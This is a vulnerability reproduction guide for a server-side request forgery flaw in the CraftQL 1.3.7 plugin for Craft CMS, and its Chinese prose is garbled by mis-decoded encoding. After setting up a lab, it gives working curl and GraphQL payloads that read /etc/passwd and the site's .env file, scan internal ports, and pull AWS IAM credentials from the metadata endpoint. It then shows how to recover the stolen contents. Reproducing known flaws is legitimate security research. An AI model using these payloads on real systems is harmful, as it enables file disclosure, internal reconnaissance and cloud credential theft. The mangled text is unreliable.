# CraftQL SSRF æ¼æ´å¤ç°æŒ‡å—

æœ¬æŒ‡å—æä¾›å®Œæ•´çš„æ¼æ´å¤ç°æ­¥éª¤ï¼Œå¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜å’Œå¼€å‘äººå‘˜ç†è§£å¹¶éªŒè¯ CraftQL SSRF æ¼æ´ã€‚

---

## ğŸ“‹ ç›®å½•

- [ç¯å¢ƒå‡†å¤‡](#ç¯å¢ƒå‡†å¤‡)
- [æ­¥éª¤ 1: å®‰è£… Craft CMS 3.x](#æ­¥éª¤-1-å®‰è£…-craft-cms-3x)
- [æ­¥éª¤ 2: å®‰è£… CraftQL æ’ä»¶](#æ­¥éª¤-2-å®‰è£…-craftql-æ’ä»¶)
- [æ­¥éª¤ 3: é…ç½®æµ‹è¯•ç¯å¢ƒ](#æ­¥éª¤-3-é…ç½®æµ‹è¯•ç¯å¢ƒ)
- [æ­¥éª¤ 4: éªŒè¯æ¼æ´å­˜åœ¨](#æ­¥éª¤-4-éªŒè¯æ¼æ´å­˜åœ¨)
- [æ­¥éª¤ 5: æ‰§è¡Œ SSRF æ”»å‡»](#æ­¥éª¤-5-æ‰§è¡Œ-ssrf-æ”»å‡»)
- [æ­¥éª¤ 6: éªŒè¯æ”»å‡»ç»“æœ](#æ­¥éª¤-6-éªŒè¯æ”»å‡»ç»“æœ)
- [å¸¸è§é—®é¢˜](#å¸¸è§é—®é¢˜)

---

## ç¯å¢ƒå‡†å¤‡

### ç³»ç»Ÿè¦æ±‚

| ç»„ä»¶ | ç‰ˆæœ¬è¦æ±‚ | è¯´æ˜ |
|------|----------|------|
| æ“ä½œç³»ç»Ÿ | Linux/macOS/Windows | æ¨è Ubuntu 20.04+ |
| PHP | 7.3 - 7.4 | Craft CMS 3.x å…¼å®¹ç‰ˆæœ¬ |
| MySQL | 5.7+ / 8.0+ | æ•°æ®åº“æœåŠ¡å™¨ |
| Composer | 2.x | PHP ä¾èµ–ç®¡ç† |
| Python | 3.6+ | è¿è¡Œ POC |
| Nginx/Apache | ä»»æ„ | Web æœåŠ¡å™¨ |

### è½¯ä»¶å®‰è£…ï¼ˆUbuntuï¼‰

```bash
# æ›´æ–°ç³»ç»Ÿ
sudo apt update && sudo apt upgrade -y

# å®‰è£… PHP å’Œæ‰©å±•
sudo apt install -y \
    php7.4 \
    php7.4-fpm \
    php7.4-mysql \
    php7.4-xml \
    php7.4-mbstring \
    php7.4-curl \
    php7.4-zip \
    php7.4-gd \
    php7.4-intl \
    php7.4-json

# å®‰è£… MySQL
sudo apt install -y mysql-server

# å®‰è£… Composer
php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
sudo php composer-setup.php --install-dir=/usr/local/bin --filename=composer
php -r "unlink('composer-setup.php');"

# å®‰è£… Nginx
sudo apt install -y nginx

# å®‰è£… Python å’Œä¾èµ–
sudo apt install -y python3 python3-pip
pip3 install requests
```

---

## æ­¥éª¤ 1: å®‰è£… Craft CMS 3.x

### 1.1 åˆ›å»ºé¡¹ç›®ç›®å½•

```bash
# åˆ›å»ºé¡¹ç›®ç›®å½•
mkdir -p ~/projects/craft-ssrf-test
cd ~/projects/craft-ssrf-test
```

### 1.2 åˆ›å»º composer.json

```bash
cat > composer.json << 'EOF'
{
    "name": "craftcms/craft-ssrf-test",
    "type": "project",
    "require": {
        "craftcms/cms": "^3.9.0"
    },
    "config": {
        "sort-packages": true,
        "optimize-autoloader": true,
        "platform": {
            "php": "7.4"
        }
    }
}
EOF
```

### 1.3 å®‰è£…ä¾èµ–

```bash
# å®‰è£… Craft CMS
composer install

# éªŒè¯å®‰è£…
php craft --version
```

**é¢„æœŸè¾“å‡º**:
```
Craft CMS 3.9.0
```

### 1.4 åˆ›å»º .env é…ç½®æ–‡ä»¶

```bash
cat > .env << 'EOF'
# Craft CMS é…ç½®
CRAFT_APP_ID=CraftCMS--SSRF-POC
CRAFT_ENVIRONMENT=dev
CRAFT_SECURITY_KEY=SSRF-TEST-KEY-12345678901234567890
DEV_MODE=true
ALLOW_ADMIN_CHANGES=true
DISALLOW_ROBOTS=true

# æ•°æ®åº“é…ç½®
DB_DRIVER=mysql
DB_SERVER=localhost
DB_PORT=3306
DB_DATABASE=
DB_USER=
DB_PASSWORD=
DB_TABLE_PREFIX=

# ç«™ç‚¹é…ç½®
BASE_URL=http://localhost:8888
PRIMARY_SITE_URL=http://localhost:8888
EOF
```

### 1.5 åˆ›å»ºæ•°æ®åº“

```bash
# ç™»å½• MySQL
sudo mysql -u root -p

# åœ¨ MySQL ä¸­æ‰§è¡Œ:
CREATE DATABASE craftcms3 CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
CREATE USER 'craftuser'@'localhost' IDENTIFIED BY 'craft123456';
GRANT ALL PRIVILEGES ON craftcms3.* TO 'craftuser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

### 1.6 å®‰è£… Craft CMS

```bash
# è¿è¡Œå®‰è£…
php craft install \
    --username=admin \
    --password=admin123 \
    --email=admin@example.com \
    --siteName="SSRF Test Site" \
    --siteUrl=http://localhost:8888

# éªŒè¯å®‰è£…
php craft db/check
```

---

## æ­¥éª¤ 2: å®‰è£… CraftQL æ’ä»¶

### 2.1 å®‰è£… CraftQL

```bash
# å®‰è£… CraftQL 1.3.7 (åŒ…å«æ¼æ´çš„ç‰ˆæœ¬)
composer require markhuot/craftql:1.3.7

# å¯ç”¨æ’ä»¶
php craft plugin/install craftql
```

**é¢„æœŸè¾“å‡º**:
```
Installing markhuot/craftql (1.3.7)
...
CraftQL plugin installed successfully.
```

### 2.2 éªŒè¯å®‰è£…

```bash
# æ£€æŸ¥æ’ä»¶çŠ¶æ€
php craft plugin/list | grep -i craftql
```

**é¢„æœŸè¾“å‡º**:
```
CraftQL     1.3.7    enabled
```

### 2.3 éªŒè¯æ¼æ´ä»£ç å­˜åœ¨

```bash
# æ£€æŸ¥æ¼æ´æ–‡ä»¶
cat vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php | \
    grep -A 5 -B 5 "file_get_contents"
```

**é¢„æœŸè¾“å‡º**:
```php
$remoteUrl = $value['url'];  // âš ï¸ ç”¨æˆ·è¾“å…¥çš„ URL
// ...
file_put_contents($uploadPath, file_get_contents($remoteUrl));  // ğŸ”´ æ¼æ´ä»£ç 
```

---

## æ­¥éª¤ 3: é…ç½®æµ‹è¯•ç¯å¢ƒ

### 3.1 åˆ›å»º Section å’Œ Entry Type

#### æ–¹æ³• A: é€šè¿‡åå°ç•Œé¢

1. è®¿é—®åå°: `http://localhost:8888/admin`
2. ç™»å½• (admin / admin123)
3. å¯¼èˆªåˆ° **Settings** â†’ **Sections**
4. ç‚¹å‡» **New Section**
   - Name: `Test Section`
   - Handle: `test`
   - Section Type: `Channel`
5. ä¿å­˜
6. åœ¨ Section ä¸­æ·»åŠ  **Entry Type**
   - Name: `Default`
   - Handle: `default`

#### æ–¹æ³• B: é€šè¿‡æ•°æ®åº“

```sql
-- ç™»å½• MySQL
mysql -u craftuser -pcraft123456 craftcms3

-- åˆ›å»º Section
INSERT INTO sections (name, handle, type, dateCreated, dateUpdated, uid)
VALUES ('Test Section', 'test', 'channel', NOW(), NOW(), UUID());

-- åˆ›å»º Entry Type (å‡è®¾ section ID ä¸º 1)
INSERT INTO entrytypes (name, handle, sectionId, fieldLayoutId, dateCreated, dateUpdated, uid)
VALUES ('Default', 'default', 1, 1, NOW(), NOW(), UUID());

EXIT;
```

### 3.2 åˆ›å»º Assets å­—æ®µ

#### é€šè¿‡åå°ç•Œé¢

1. å¯¼èˆªåˆ° **Settings** â†’ **Fields**
2. ç‚¹å‡» **New Field**
3. é€‰æ‹© **Assets** ç±»å‹
4. é…ç½®:
   - Name: `Hero Image`
   - Handle: `heroImage`
   - Upload Location: `uploads/`
5. ä¿å­˜

#### é€šè¿‡æ•°æ®åº“

```sql
-- ç™»å½• MySQL
mysql -u craftuser -pcraft123456 craftcms3

-- åˆ›å»º Assets å­—æ®µ
INSERT INTO fields (groupId, name, handle, type, dateCreated, dateUpdated, uid)
VALUES (NULL, 'Hero Image', 'heroImage', 'craft\\fields\\Assets', NOW(), NOW(), UUID());

-- è·å–å­—æ®µ ID (å‡è®¾ä¸º 101)
SELECT id, name, handle FROM fields WHERE handle='heroImage';

-- å°†å­—æ®µæ·»åŠ åˆ° Field Layout
INSERT INTO fieldlayoutfields (layoutId, fieldId, tabId, required, sortOrder, dateCreated, dateUpdated, uid)
VALUES (1, 101, 1, 0, 1, NOW(), NOW(), UUID());

EXIT;
```

### 3.3 åˆ›å»º GraphQL Token

#### æ–¹æ³• A: é€šè¿‡åå°ç•Œé¢

1. å¯¼èˆªåˆ° **Settings** â†’ **GraphQL** â†’ **Tokens**
2. ç‚¹å‡» **New Token**
3. é…ç½®:
   - Name: `Test Token`
   - ä¿å­˜ç”Ÿæˆçš„ Token
4. ç¼–è¾‘ Token æƒé™:
   - å‹¾é€‰ **mutate:entryType:1**
   - å‹¾é€‰ **query:entryType:1**
   - ä¿å­˜

#### æ–¹æ³• B: é€šè¿‡æ•°æ®åº“

```sql
-- ç™»å½• MySQL

-- ç”Ÿæˆ Token
INSERT INTO craftql_tokens (name, token, scopes, userId, dateCreated, dateUpdated, uid)
VALUES (
    'Test Token',
    'l-ir-ck7b2W*********************************ySD',
    JSON_OBJECT(
        'query:sites', '1',
        'query:entries', '1',
        'query:assets', '1',
        'query:entryType:1', '1',
        'mutate:entryType:1', '1'
    ),
    1,
    NOW(),
    NOW(),
    UUID()
);

-- éªŒè¯
SELECT id, name, scopes FROM craftql_tokens WHERE name='Test Token';

EXIT;
```

### 3.4 é…ç½® Web æœåŠ¡å™¨

#### Nginx é…ç½®

```bash
sudo cat > /etc/nginx/sites-available/craft-ssrf << 'EOF'
server {
    listen 8888;
    server_name localhost;
    root /home/ubuntu/projects/craft-ssrf-test/web;

    index index.php;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    }

    # Deny access to config files
    location ~ /\.(ht|git|env) {
        deny all;
    }
}
EOF

# å¯ç”¨ç«™ç‚¹
sudo ln -s /etc/nginx/sites-available/craft-ssrf /etc/nginx/sites-enabled/

# æµ‹è¯•é…ç½®
sudo nginx -t

# é‡å¯ Nginx
sudo systemctl restart nginx
```

#### éªŒè¯è®¿é—®

```bash
# è®¿é—®å‰å°
curl -I http://localhost:8888

# è®¿é—® GraphQL API
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __typename }"}'
```

---

## æ­¥éª¤ 4: éªŒè¯æ¼æ´å­˜åœ¨

### 4.1 æ£€æŸ¥æ¼æ´ä»£ç 

```bash
# æŸ¥çœ‹æ¼æ´æ–‡ä»¶
cat vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php | \
    grep -n "file_get_contents"
```

**é¢„æœŸè¾“å‡º**:
```
56:                    file_put_contents($uploadPath, file_get_contents($remoteUrl));
```

### 4.2 æ£€æŸ¥ GraphQL Schema

```bash
# æŸ¥è¯¢å¯ç”¨çš„ Mutations
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Authorization: Bearer l-ir-ck7b2WoVOOKEqVhhh1-Cm-tw4ero5gD7OC0qcC96GMGJaCs7NLaXlNUcySD" \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __schema { mutationType { fields { name description } } } }"}' | \
    python3 -m json.tool
```

**é¢„æœŸè¾“å‡º**:
```json
{
  "data": {
    "__schema": {
      "mutationType": {
        "fields": [
          {
            "name": "helloWorld",
            "description": "A sample mutation."
          },
          {
            "name": "upsertTestDefault",
            "description": "Create or update existing TestDefault."
          }
        ]
      }
    }
  }
}
```

### 4.3 æµ‹è¯•åŸºç¡€ Mutation

```bash
# æµ‹è¯• helloWorld mutation
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Authorization: Bearer l-ir-ck*********UcySD" \
    -H "Content-Type: application/json" \
    -d '{"query": "mutation { helloWorld }"}' | \
    python3 -m json.tool
```

**é¢„æœŸè¾“å‡º**:
```json
{
  "data": {
    "helloWorld": "If this were a real mutation it would have saved to the database."
  }
}
```

---

## æ­¥éª¤ 5: æ‰§è¡Œ SSRF æ”»å‡»

### æ”»å‡» #1: è¯»å– /etc/passwd

#### GraphQL æŸ¥è¯¢

```graphql
mutation {
  upsertTestDefault(
    title: "SSRF POC 1"
    heroImage: {url: "file:///etc/passwd"}
  ) {
    id
    title
  }
}
```

#### cURL å‘½ä»¤

```bash
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Authorization: Bearer l-ir-ck7b********SD" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "mutation { upsertTestDefault(title: \"SSRF POC 1\", heroImage: {url: \"file:///etc/passwd\"}) { id title } }"
    }'
```

#### é¢„æœŸå“åº”

```json
{
  "errors": [
    {
      "message": "Internal server error",
      "extensions": {
        "category": "internal"
      }
    }
  ],
  "data": {
    "upsertTestDefault": null
  }
}
```

**æ³¨æ„**: "Internal server error" è¡¨ç¤º SSRF å·²è§¦å‘ï¼

### æ”»å‡» #2: è¯»å– .env é…ç½®æ–‡ä»¶

#### GraphQL æŸ¥è¯¢

```graphql
mutation {
  upsertTestDefault(
    title: "SSRF POC 2"
    heroImage: {url: "file:///home/ubuntu/projects/craft-ssrf-test/.env"}
  ) {
    id
  }
}
```

#### cURL å‘½ä»¤

```bash
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Authorization: Bearer l-ir-ck7b2WoVOOKEqVhhh1-Cm-tw4ero5gD7OC0qcC96GMGJaCs7NLaXlNUcySD" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "mutation { upsertTestDefault(title: \"SSRF POC 2\", heroImage: {url: \"file:///home/ubuntu/projects/craft-ssrf-test/.env\"}) { id } }"
    }'
```

### æ”»å‡» #3: å†…ç½‘ç«¯å£æ‰«æ

#### GraphQL æŸ¥è¯¢

```graphql
mutation {
  upsertTestDefault(
    title: "Port Scan"
    heroImage: {url: "http://192.168.1.1:22/"}
  ) {
    id
  }
}
```

#### cURL å‘½ä»¤

```bash
# æ‰«æ SSH ç«¯å£ (22)
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Authorization: Bearer l-ir-ck7b2WoVOOKEqVhhh1-Cm-tw4ero5gD7OC0qcC96GMGJaCs7NLaXlNUcySD" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "mutation { upsertTestDefault(title: \"Port Scan SSH\", heroImage: {url: \"http://192.168.1.1:22/\"}) { id } }"
    }' \
    --max-time 65
```

**ç«¯å£åˆ¤æ–­**:
- å“åº”æ—¶é—´ > 5ç§’: ç«¯å£å¯èƒ½å¼€æ”¾
- å“åº”æ—¶é—´ < 1ç§’: ç«¯å£å¯èƒ½å…³é—­

### æ”»å‡» #4: äº‘å…ƒæ•°æ®çªƒå– (AWS)

#### GraphQL æŸ¥è¯¢

```graphql
mutation {
  upsertTestDefault(
    title: "Cloud Meta"
    heroImage: {url: "http://169.254.***.254/latest/meta-data/iam/security-credentials/"}
  ) {
    id
  }
}
```

#### cURL å‘½ä»¤

```bash
curl -X POST http://localhost:8888/index.php?p=api \
    -H "Authorization: Bearer l-ir-ck7b***************ySD" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "mutation { upsertTestDefault(title: \"Cloud Meta\", heroImage: {url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}) { id } }"
    }'
```

---

## æ­¥éª¤ 6: éªŒè¯æ”»å‡»ç»“æœ

### 6.1 æŸ¥æ‰¾ä¸‹è½½çš„æ–‡ä»¶

```bash
# æŸ¥æ‰¾æœ€è¿‘1åˆ†é’Ÿå†…ä¿®æ”¹çš„ä¸´æ—¶æ–‡ä»¶
find /home/ubuntu/projects/craft-ssrf-test/storage/runtime/temp/ \
    -type f \
    -mmin -1 \
    -name "*.tmp" \
    -ls
```

**é¢„æœŸè¾“å‡º**:
```
304586  4 -rw-rw-r-- 1 ubuntu ubuntu 2981 2æœˆ  6 14:30 ./assets69858b494ede25.38879089.tmp
```

### 6.2 æŸ¥çœ‹æ–‡ä»¶å†…å®¹

#### æŸ¥çœ‹ /etc/passwd

```bash
# è·å–æœ€æ–°æ–‡ä»¶
LATEST_FILE=$(find /home/ubuntu/projects/craft-ssrf-test/storage/runtime/temp/ \
    -type f -mmin -1 -name "*.tmp" | sort | tail -1)

# æŸ¥çœ‹å†…å®¹
cat $LATEST_FILE
```

**é¢„æœŸè¾“å‡º**:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

#### æŸ¥çœ‹ .env æ–‡ä»¶

```bash
# æŸ¥æ‰¾åŒ…å«æ•°æ®åº“å¯†ç çš„æ–‡ä»¶
grep -l "DB_PASSWORD" /home/ubuntu/projects/craft-ssrf-test/storage/runtime/temp/*.tmp

# æŸ¥çœ‹å†…å®¹
cat $(grep -l "DB_PASSWORD" /home/ubuntu/projects/craft-ssrf-test/storage/runtime/temp/*.tmp)
```

**é¢„æœŸè¾“å‡º**:
```
DB_DATABASE=craftcms3
DB_USER=craftuser
DB_PASSWORD=craft123456
```

### 6.3 ç›‘æ§æœåŠ¡å™¨æ—¥å¿—

```bash
# å®æ—¶ç›‘æ§åº”ç”¨æ—¥å¿—
tail -f /home/ubuntu/projects/craft-ssrf-test/storage/logs/web.log | \
    grep -i "error\|warning\|ssrf"
```

### 6.4 ä½¿ç”¨è‡ªåŠ¨åŒ– POC

```bash
# Python ç‰ˆæœ¬
python3 poc/ssrf_poc.py
```
